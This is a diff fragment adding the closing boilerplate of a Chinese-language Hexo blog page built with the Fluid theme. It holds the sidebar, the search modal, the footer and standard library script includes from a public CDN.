+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/5.0.0/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
